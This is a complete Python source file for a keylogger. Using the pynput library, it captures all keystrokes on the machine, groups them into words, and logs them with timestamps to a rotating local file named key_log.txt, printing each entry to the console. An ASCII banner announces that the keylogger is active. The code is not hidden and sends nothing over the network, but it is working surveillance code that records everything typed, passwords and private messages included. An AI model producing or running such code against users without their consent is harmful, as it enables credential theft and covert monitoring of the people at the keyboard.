import logging
import time
from datetime import datetime
from pynput.keyboard import Key, Listener
from logging.handlers import RotatingFileHandler
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Constants
LOG_FILE = "key_log.txt"
LOG_MAX_SIZE = 5 * 1024  # 5 KB
BACKUP_COUNT = 3

# Logging setup (manual timestamp)
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[
        RotatingFileHandler(
            LOG_FILE,
            maxBytes=LOG_MAX_SIZE,
            backupCount=BACKUP_COUNT
        )
    ],
)

def display_startup_banner():
    banner = rf"""
{Fore.CYAN}

 #  _  __              _                                     
# | |/ / ___  _   _  | |     ___    __ _   __ _   ___  _ __ 
# | ' / / _ \| | | | | |    / _ \  / _` | / _` | / _ \| '__|
# | . \|  __/| |_| | | |___| (_) || (_| || (_| ||  __/| |   
# |_|\_\___| \__, | |_____|\___/  \__, | \__, | \___||_|   
#             |___/                |___/  |___|             

{Fore.GREEN}
Keylogger is Active. Press Ctrl+C to Stop.
{Style.RESET_ALL}
"""
    print(banner)
    time.sleep(1)

# Buffer to build words
current_word = ""

def log_event(text):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"{timestamp}  ->  {text}"

    print(Fore.CYAN + line + Style.RESET_ALL)
    logging.info(line)

def process_key(key):
    global current_word

    try:
        # Normal characters
        if hasattr(key, "char") and key.char is not None:
            current_word += key.char

        # Space
        elif key == Key.space:
            if current_word:
                log_event(current_word)
                current_word = ""
            log_event("Space")

        # Enter
        elif key == Key.enter:
            if current_word:
                log_event(current_word)
                current_word = ""
            log_event("Enter")

        # Backspace
        elif key == Key.backspace:
            if current_word:
                current_word = current_word[:-1]
            else:
                log_event("Backspace")

        # Tab
        elif key == Key.tab:
            if current_word:
                log_event(current_word)
                current_word = ""
            log_event("Tab")

        # Escape
        elif key == Key.esc:
            log_event("Escape")

    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")

def start_keylogger():
    try:
        display_startup_banner()
        print(f"{Fore.GREEN}Keylogger is now capturing keystrokes...\n{Style.RESET_ALL}")
        with Listener(on_press=process_key) as listener:
            listener.join()

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[STOPPED]{Style.RESET_ALL} Keylogger stopped by user.")

if __name__ == "__main__":
    start_keylogger()
